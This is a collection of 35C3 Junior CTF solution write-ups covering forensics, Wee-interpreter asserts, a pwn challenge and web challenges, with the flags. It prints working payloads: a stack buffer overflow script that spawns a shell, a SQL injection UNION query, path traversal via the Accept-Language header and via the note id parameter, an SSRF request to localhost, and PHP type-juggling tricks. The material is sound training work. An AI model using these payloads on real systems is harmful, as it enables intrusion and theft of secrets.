# Category: For
## Name: rare_mount
### Difficulty: Easy
### Description: 
Little or big, we do not care! [FS](https://35c3ctf.ccc.ac/uploads/juniorctf/ffbde7acedff79aa36f0f5518aad92d3-rare-fs.bin)
### Solution
After downloading the file, we noticed that it is a JFFS2 filesystem:  
```
➜  35C3CTF binwalk ffbde7acedff79aa36f0f5518aad92d3-rare-fs.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JFFS2 filesystem, big endian
```
After some googling we found a tool called [jefferson](https://github.com/sviehb/jefferson) which analysed the file and gave us the flag `35C3_big_or_little_1_dont_give_a_shizzle`

# Category: Misc
## Name: Conversion Error
### Difficulty: Medium
### Description: 
With assert_string(str: string), we assert that our VM properly handles conversions. So far we never triggered the assertion and are certain it's impossible.

http://35.207.189.79/
### Solution
This one is part of the Wee Framework, so I'll give an intro here and take it for granted in the other challenges:  
We know that the server source code is at `/pyserver/server.py`, in there wee find the Weeterpreter which is an interpreter for Wee code => `/weelang/weeterpreter.ts`.
In the Weeterpreter file we can see all the various assert functions which will be exploited in this category. The first one is `assert_conversion`.  
As we can see in the interpreter this is the check which is performed for the input strings:
```
(str: string) => str.length === +str + "".length || !/^[1-9]+(\.[1-9]+)?$/.test(str)
            ? "Convert to Pastafarianism" : flags.CONVERSION_ERROR
```
After some playing around this is the payload which we came up with: 
```
➜  35C3CTF http -vvvv POST http://35.207.189.79/wee/run code="alert(assert_conversion('33333.4222'))"
[...]
{
    "code": "alert(assert_conversion('33333.4222'))",
    "result": "35C3_FLOATING_POINT_PROBLEMS_I_FEEL_B4D_FOR_YOU_SON\n"
}
```

## Name: Equality Error
### Difficulty: Medium
### Description: 
At assert_equals(num: number), we've added an assert to make sure our VM properly handles equality. With only a few basic types, it's impossible to mess this one up, so the assertion has never been triggered. In case you do by accident, please report the output.

http://35.207.189.79/
### Solution
This challenge is like the JS meme where number === number returns false... Payload:
```
➜  35C3CTF http -vvvv POST http://35.207.189.79/wee/run code="alert(assert_equals(ord('')))"
[...]
{
    "code": "alert(assert_equals(ord('')))",
    "result": "35C3_NANNAN_NANNAN_NANNAN_NANNAN_BATM4N\n"
}
```

## Name: Number Error
### Difficulty: Easy-Medium
### Description: 
The function assert_number(num: number) is merely a debug function for our Wee VM (WeeEm?). It proves additions always work. Just imagine the things that could go wrong if it wouldn't!

http://35.207.189.79/
### Solution
```
➜  35C3CTF http -vvvv POST http://35.207.189.79/wee/run code="alert(assert_number(99999999999999999))"
[...]
{
    "code": "alert(assert_number(99999999999999999))",
    "result": "35C3_THE_AMOUNT_OF_INPRECISE_EXCEL_SH33TS\nn"
}
```

## Name: Wee R Leet
### Difficulty: Easy
### Description: 
Somebody forgot a useless assert function in the interpreter somewhere. In our agile development lifecycle somebody added the function early on to prove it's possible. Wev've only heared stories but apparently you can trigger it from Wee and it behaves differently for some "leet" input(?) What a joker. We will address this issue over the next few sprints. Hopefully it doesn't  do any harm in the meantime.

http://35.207.189.79/
### Solution
We can see that the check is on 0x1337, so in dec => 4919
```
➜  35C3CTF http -vvvv POST http://35.207.189.79/wee/run code="alert(assert_leet(4919)"
[...]
{
    "code": "alert(assert_leet(4919))",
    "result": "35C3_HELLO_WEE_LI77LE_WORLD\n"
}
```

## Name: Wee Token
### Difficulty: Easy
### Description: 
We _need_ to make sure strings in Wee are also strings in our runtime. Apparently attackers got around this and actively exploit us! We do not know how. Calling out to haxxor1, brocrowd, kobold.io,...: if anybody can show us how they did it, please, please please submit us the token the VM will produce. We added the function assert_string(str: string) for your convenience. You might get rich - or not. It depends a bit on how we feel like and if you reach our technical support or just 1st level. Anyway: this is a call to arms and a desperate request, that, we think, is usually called Bugs-Bunny-Program... or something? Happy hacking.

http://35.207.189.79/

Difficulty estimate: Easy
### Solution
```
➜  35C3CTF http -vvvv POST http://35.207.189.79/wee/run code="alert(assert_string(eval('null')))"
[...]
{
    "code": "alert(assert_string(eval('null')))",
    "result": "35C3_WEE_IS_TINY_AND_SO_CONFU5ED\n"
}

```

# Category: Pwn

## Name: 1996
### Difficulty: very easy
### Description: 
It's [1996](https://35c3ctf.ccc.ac/uploads/juniorctf/1996-846a46384ff5d85d861c09fc49912def510336e0.zip) all over again!

`nc 35.207.132.47 22227`  
### Solution
So this was our first b0f we did, TL;DR is:  
1. Look at the source, see that the buffer is 1024  
2. objdump the binary and look at the spawn_shell address
3. Load the binary into gbd, set breakpoints and see when we start overwriting RIP  
4. Overflow, then set RIP accordingly, get a shell  
5. Get the flag  
  
So we piped the output of this into a file
```
#!/usr/bin/python3

attack = 'A' * 1047 + "\x97\x08\x40\x00\x00\x00"

print(attack)
```
and then:
```➜  35C3CTF cat payload - | nc 35.207.132.47 22227
Which environment variable do you want to read? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@=ls
1996
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
35C3_b29a2800780d85cfc346ce5d64f52e59c8d12c14

```

# Category: Web

## Name: collider
### Difficulty: /
### Description: 
Your task is pretty simple: Upload two PDF files. The first should contain the string "NO FLAG!" and the other one "GIVE FLAG!", but both should have the same MD5 hash!

http://35.207.133.246
### Solution
If you look at the source of the page you can find `<!-- My source is at /src.tgz -->`.
But since we totally forgot that this is a web challenge, we actually [generated](https://github.com/corkami/pocs/blob/master/collisions/README.md) 2 PDFs with the same MD5 hash...  
`35C3_N3v3r_TrusT_MD5`

## Name: DB Secret
### Difficulty: Medium
### Description: 
To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.

http://35.207.189.79/
### Solution
We need to find an endpoint where input is not sanitized and where we can then perform a SQLi, this happens to be `/api/getprojectsadmin`. Additionally, we need to set a valid token (we got this just by logging in) and set name=admin in the cookies. Now we can send JSON payloads and the `offset` value will be out attack vector:
```
{ 
    "offset":"1' UNION SELECT secret, 1,1,1,1,1,1,1 from SECRETS WHERE '1'='1",
    "sorting":"newest"
 }

flag: 35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???
```

## Name: flags
### Difficulty: easy 
### Description: 
Fun with flags: http://35.207.169.47

Flag is at /flag
### Solution
We just need to access `/flag` but `../` is stripped out. As we can see, the `Accept-Language` header is our attack vector.
Luckily this was fairly easy to bypass:
```
➜  35C3CTF http GET 35.207.169.47  Accept-Language:....//....//....//....//....//....//....//....//flag
```
Now we got this b64 string as a response: `<img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">`
And now:
```
➜  35C3CTF echo "MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=" | base64 -D
35c3_this_flag_is_the_be5t_fl4g
```

## Name: localhost
### Difficulty: Medium
### Description: 
We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.

http://35.207.189.79/
### Solution
This was one of my favourite challenges. After a first glance at the server source code, I thought that spoofing our IP was enough, but since it reads the `remote_addr`, setting the `X-Forwarded-For` Header to localhost doesn't work.  
After some more reading of the source code we found the `/api/proxyimage` endpoint, which we can use to exploit a SSRF vuln.
Additionally, we need to load an image which is not a PNG, JPG or GIF or else the flag will be stripped out. Luckily, the image on the homepage is a SVG ;)
```
➜  35C3CTF http --headers http://35.207.189.79/api/proxyimage\?url\=http://127.0.0.1:8075/img/paperbots.svg
HTTP/1.1 200 OK
[...]
X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
```


## Name: Logged In
### Difficulty: Easy
### Description: 
Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.

http://35.207.189.79/

Difficulty Estimate: Easy
### Solution
This was literally logging in via the api...
```
➜  35C3CTF http http://35.207.189.79/api/signup name=kontez email=kontez@ccc.de
HTTP/1.1 200 OK
[...]
{
    "success": true
}

➜  35C3CTF http http://35.207.189.79/api/login email=kontez@ccc.de
HTTP/1.1 200 OK
[...]

sdcytu

➜  35C3CTF http http://35.207.189.79/api/verify code=sdcytu
HTTP/1.1 200 OK
[...]
Set-Cookie: token=udjqvjltkdlrpmjvbyxmmnhdjbfhryuz; Expires=Thu, 16-Jan-2087 22:11:14 GMT; Max-Age=2147483647; Path=/
Set-Cookie: name=kontez; Expires=Thu, 16-Jan-2087 22:11:14 GMT; Max-Age=2147483647; Path=/
Set-Cookie: logged_in=35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS; Path=/
```

## Name: Mc Donald
### Difficulty: /
### Description: 
Our web admin name's "Mc Donald" and he likes apples and always forgets to throw away his apple cores..

http://35.207.91.38
### Solution
After looking at the `/robots.txt` we found `/backup/.DS_Store`.
The creator of the challenge has a repo on github with a python package which analyzes .DS_Store files. However, [this tool](https://github.com/lijiejie/ds_store_exp) works soooo much better and gives us the flag:
```
➜  35C3CTF http --body http://35.207.91.38/backup/b/a/c/flag.txt
35c3_Appl3s_H1dden_F1l3s
```

## Name: Not(e) Accessible
### Difficulty: Easy-Medium
### Description: 
We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.

Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...

http://35.207.120.163
### Solution
Just as on collider we can download the source code for the php files. After a quick look we can see that we need to access /admin in order to get the flag.
In the viewer.php we can see this:
```
if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                echo file_get_contents($BACKEND . "get/" . $id);
```
Note that the id is only casted to int in the if, but then it is used without being sanitized, so after generating a valid id & pw from the tool we can grab the flag like this:
```
➜  35C3CTF http --body http://35.207.120.163/view.php\?id\=7348169671344389575/../../admin\&pw\=7815696ecbf1c96e6894b779456d330e
35C3_M1Cr0_S3rvices_4R3_FUN!
```

## Name: saltfish
### Difficulty: /
### Description: 
"I have been told that the best crackers in the world can do this under 60 minutes but unfortunately I need someone who can do this under 60 seconds." - Gabriel

http://35.207.89.211
### Solution
After we pass `pass` as a GET variable and an according user agent, these are the checks:
```
if (md5($_) + $_[0] == md5($ua)) {
      if ($_[0] == md5($_[0] . $flag)[0]) {
        echo $flag;
```
AAAAAAAAAARGH PHP!!!
The first if is always true. Just look at this example and you'll know why:
```
<?php
    $a = 2; // PHP int
    $b = '2PHP'; // PHP string
    var_dump($a == $b); // results bool(true)
```
The second check concatenates `$_[0]` and the flag, but only checks on the first character, so you just need two md5 hashes with the same first character. Honestly at this point we just bruteforced, and with pass=b and User-Agent:b it worked:
```
➜  35C3CTF http --body http://35.207.89.211/\?pass\=b 'User-Agent:b'
35c3_password_saltf1sh_30_seconds_max
```

# Wee
Good coders should learn one new language every year.

InfoSec folks are even used to learn one new language for every new problem they face (YMMV).

If you have not picked up a new challenge in 2018, you're in for a treat.

We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.

Some cool Projects can be created in Wee, like: this, this and that.

Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.

Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).

We even added new features to this better server, like server-side Wee evaluation!

To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

